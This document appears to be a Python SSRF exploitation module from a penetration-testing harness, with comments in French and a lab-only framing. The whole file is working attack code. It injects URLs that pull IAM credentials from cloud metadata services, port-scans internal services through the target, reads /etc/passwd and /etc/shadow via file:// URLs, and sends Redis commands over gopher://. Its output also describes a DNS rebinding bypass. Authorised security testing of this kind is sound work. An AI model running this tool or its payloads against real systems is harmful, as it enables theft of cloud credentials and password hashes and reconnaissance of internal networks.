#!/usr/bin/env python3
# HARNESS-VALIDATION v2.7.0 — module SSRF (Phase 2, Initial Access).
# Combler le gap Phase 2 du harness : détection Server-Side Request Forgery.
#   - v2.7 : cloud metadata endpoints (AWS IMDSv1, AWS IMDSv2, GCP, Azure)
#   - v2.7 : scan de ports internes via loopback (22, 80, 443, 3306, 5432,
#            6379, 8080, 9200) — détection par diff status/len/temps vs baseline
#   - v2.7 : protocol smuggling (file://, gopher://)
#   - v2.7 : DNS rebinding hint (informationnel, non testé ici)
#   - v2.7 : reproductibilité via SEED (ordre endpoints mélangé)
#   - v2.7 : timeout=5 + allow_redirects=False sur toutes les requêtes
# Cadre légal : laboratoires isolés uniquement (cf. README §Cadre légal).
import json
import random
import re
import sys
import time
from typing import Optional

import requests

HARNESS_VERSION = "2.7.0"
DEFAULT_SEED = 1337
PORT_BASELINE = 1                  # port de référence (fermé) pour comparaison
LEN_DIFF_TOLERANCE = 10            # tolérance bruit comparaison de ports (bytes)

# --- Args CLI ---------------------------------------------------------------
TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/fetch"
PARAM  = sys.argv[2] if len(sys.argv) > 2 else "url"
SEED   = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_SEED

# --- Cloud metadata endpoints ----------------------------------------------
# (nom, url_injectée, hint_headers_optionnels, patterns_leak, provider)
# NOTE : les hint_headers sont passés côté CLIENT (notre requête vers la cible)
# — ils ne servent à rien pour la requête serveur->metadata. On documente
# ici que IMDSv2 / GCP / Azure nécessitent que le SERVEUR ajoute ces en-têtes
# (Metadata-Flavor, Metadata: true, X-aws-ec2-metadata-token) à sa propre
# requête sortante. Une cible naïve (file_get_contents sans headers) ne
# fuitera que IMDSv1 AWS. On garde les endpoints pour mesurer la couverture.
LEAK_PATTERNS = [
    re.compile(rb"AccessKeyId",       re.I),
    re.compile(rb"SecretAccessKey",   re.I),
    re.compile(rb"accountId",         re.I),
    re.compile(rb"subscriptionId",    re.I),
]

METADATA_ENDPOINTS: list[tuple[str, str, str]] = [
    # (nom, url_injectée_dans_PARAM, provider)
    ("aws_imdsv1",
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "AWS"),
    ("aws_imdsv2_token",
     # IMDSv2 requiert un token PUT préalable — on teste quand même l'endpoint
     # pour mesurer la couverture, le leak ne se produira que si le serveur
     # implémente IMDSv2 côté fetch.
     "http://169.254.169.254/latest/api/token",
     "AWS"),
    ("gcp_metadata",
     "http://metadata.google.internal/computeMetadata/v1/",
     "GCP"),
    ("azure_metadata",
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "Azure"),
]

# --- Ports internes à scanner via SSRF --------------------------------------
INTERNAL_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]

# --- Protocol smuggling -----------------------------------------------------
# (nom, url_injectée, pattern_leak, label_detection)
SMUGGLE_PAYLOADS: list[tuple[str, str, re.Pattern[bytes], str]] = [
    ("file_passwd",
     "file:///etc/passwd",
     re.compile(rb"root:x:0:"),
     "etc_passwd_leak"),
    ("file_shadow",
     "file:///etc/shadow",
     re.compile(rb"root:[^\s]+:"),
     "etc_shadow_leak"),
    ("gopher_redis_info",
     "gopher://127.0.0.1:6379/_INFO",
     re.compile(rb"redis_version|run_id|os:", re.I),
     "redis_info_leak"),
]

# Regex de détection d'erreur de connexion côté serveur (proxy renvoie
# une page d'erreur générique — on utilise ces patterns pour qualifier).
CONN_ERROR_PATTERNS = [
    re.compile(rb"connection refused",       re.I),
    re.compile(rb"connect timed out",        re.I),
    re.compile(rb"connection timed out",     re.I),
    re.compile(rb"no route to host",         re.I),
    re.compile(rb"network is unreachable",   re.I),
    re.compile(rb"failed to connect",        re.I),
]


def detect_metadata_leak(content: bytes) -> bool:
    return any(p.search(content) for p in LEAK_PATTERNS)


def detect_conn_error(content: bytes) -> bool:
    return any(p.search(content) for p in CONN_ERROR_PATTERNS)


def build_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": f"harness/{HARNESS_VERSION} (ssrf)",
        "X-Forwarded-For": "127.0.0.1",
        "Accept": "*/*",
    })
    return s


def fetch(session: requests.Session, url_value: str) -> dict:
    """Envoie une requête GET vers TARGET avec PARAM=url_value.
    Le serveur cible est censé fetcher url_value (le vecteur SSRF).
    timeout=5 + allow_redirects=False sur chaque appel."""
    t0 = time.time()
    try:
        r = session.get(
            TARGET,
            params={PARAM: url_value},
            timeout=5,
            allow_redirects=False,
        )
        return {
            "status": r.status_code,
            "len": len(r.content),
            "ms": round((time.time() - t0) * 1000, 1),
            "content": r.content,
            "error": None,
        }
    except requests.RequestException as e:
        return {
            "status": None,
            "len": 0,
            "ms": round((time.time() - t0) * 1000, 1),
            "content": b"",
            "error": type(e).__name__,
        }


def run_metadata(session: requests.Session, rng: random.Random) -> tuple[list[dict], bool, Optional[str]]:
    """Phase 1 : cloud metadata. Retourne (résultats, leak_détecté, provider)."""
    ordered = METADATA_ENDPOINTS[:]
    rng.shuffle(ordered)
    results = []
    leaked_provider: Optional[str] = None
    metadata_leaked = False
    for name, url_value, provider in ordered:
        r = fetch(session, url_value)
        leak = (r["error"] is None and detect_metadata_leak(r["content"]))
        results.append({
            "endpoint": name,
            "provider": provider,
            "status": r["status"],
            "len": r["len"],
            "ms": r["ms"],
            "leak": leak,
            "error": r["error"],
        })
        if leak and not metadata_leaked:
            metadata_leaked = True
            leaked_provider = provider
    return results, metadata_leaked, leaked_provider


def run_port_scan(session: requests.Session, rng: random.Random) -> tuple[list[dict], list[int]]:
    """Phase 2 : scan de ports internes via SSRF.
    Méthode : baseline sur port 1 (fermé), puis pour chaque port candidat
    on compare status/len/temps. Si diff significative → port probablement
    ouvert (le serveur a obtenu une réponse HTTP au lieu d'une erreur)."""
    # Baseline : port fermé de référence.
    baseline = fetch(session, f"http://127.0.0.1:{PORT_BASELINE}/")
    bl_status = baseline["status"]
    bl_len = baseline["len"]
    bl_ms = baseline["ms"]

    ordered = INTERNAL_PORTS[:]
    rng.shuffle(ordered)
    results = []
    open_ports: list[int] = []
    for port in ordered:
        r = fetch(session, f"http://127.0.0.1:{port}/")
        # Heuristiques d'ouverture :
        #  (a) status 200 avec body différent du baseline (le serveur a obtenu
        #      une vraie réponse HTTP depuis le port)
        #  (b) pas d'erreur connexion ET len diff > tolérance
        #  (c) temps < 4.5s (port fermé sur loopback répond instantanément
        #      "connection refused" — un port HTTP ouvert répond aussi vite mais
        #      avec un body ; un port non-HTTP peut faire timeout)
        conn_err = (r["error"] is None
                    and detect_conn_error(r["content"]))
        is_open = False
        if r["error"] is None:
            if r["status"] == 200 and abs(r["len"] - bl_len) > LEN_DIFF_TOLERANCE:
                is_open = True
            elif (not conn_err
                  and r["status"] != bl_status
                  and abs(r["len"] - bl_len) > LEN_DIFF_TOLERANCE):
                is_open = True
        results.append({
            "endpoint": f"port_{port}",
            "port": port,
            "status": r["status"],
            "len": r["len"],
            "ms": r["ms"],
            "baseline_status": bl_status,
            "baseline_len": bl_len,
            "conn_error": conn_err,
            "open": is_open,
            "error": r["error"],
        })
        if is_open:
            open_ports.append(port)
    # Tri déterministe (indépendant du shuffle) pour le rapport
    open_ports.sort()
    return results, open_ports


def run_smuggling(session: requests.Session) -> tuple[list[dict], bool]:
    """Phase 3 : protocol smuggling (file://, gopher://)."""
    results = []
    any_leak = False
    for name, url_value, pattern, label in SMUGGLE_PAYLOADS:
        r = fetch(session, url_value)
        leak = (r["error"] is None and bool(pattern.search(r["content"])))
        if leak:
            any_leak = True
        results.append({
            "endpoint": name,
            "scheme": url_value.split("://")[0],
            "status": r["status"],
            "len": r["len"],
            "ms": r["ms"],
            "leak": leak,
            "leak_label": label if leak else None,
            "error": r["error"],
        })
    return results, any_leak


def main() -> None:
    rng = random.Random(SEED)
    session = build_session()

    # --- Phase 1 : cloud metadata ------------------------------------------
    meta_results, metadata_leaked, cloud_provider = run_metadata(session, rng)

    # --- Phase 2 : port scan interne ---------------------------------------
    port_results, open_ports = run_port_scan(session, rng)

    # --- Phase 3 : protocol smuggling --------------------------------------
    smuggle_results, smuggle_leak = run_smuggling(session)

    # --- Synthèse -----------------------------------------------------------
    ssrf_found = bool(open_ports) or metadata_leaked or smuggle_leak

    all_results: list[dict] = list(meta_results)
    all_results.extend(port_results)
    all_results.extend(smuggle_results)

    print(json.dumps({
        "module": "ssrf",
        "harness_version": HARNESS_VERSION,
        "seed": SEED,
        "target": TARGET,
        "param": PARAM,
        "metadata_endpoints_tested": len(METADATA_ENDPOINTS),
        "metadata_leaked": metadata_leaked,
        "cloud_provider": cloud_provider,
        "internal_ports_tested": len(INTERNAL_PORTS),
        "open_ports": open_ports,
        "protocol_smuggling_tested": len(SMUGGLE_PAYLOADS),
        "smuggle_leak": smuggle_leak,
        "ssrf_found": ssrf_found,
        # Informationnel : DNS rebinding non testé mais documenté comme
        # contournement possible des filtres IP-based (le serveur résout
        # un hostname qui pointe d'abord vers une IP valide puis, après
        # validation, vers 169.254.169.254 via TTL court).
        "dns_rebinding_hint": (
            "DNS rebinding bypasses IP-based SSRF filters by resolving a "
            "hostname to a public IP first, then to 169.254.169.254 via a "
            "short TTL record. Not tested here — informational only."
        ),
        "results": all_results,
    }, indent=2))


if __name__ == "__main__":
    main()
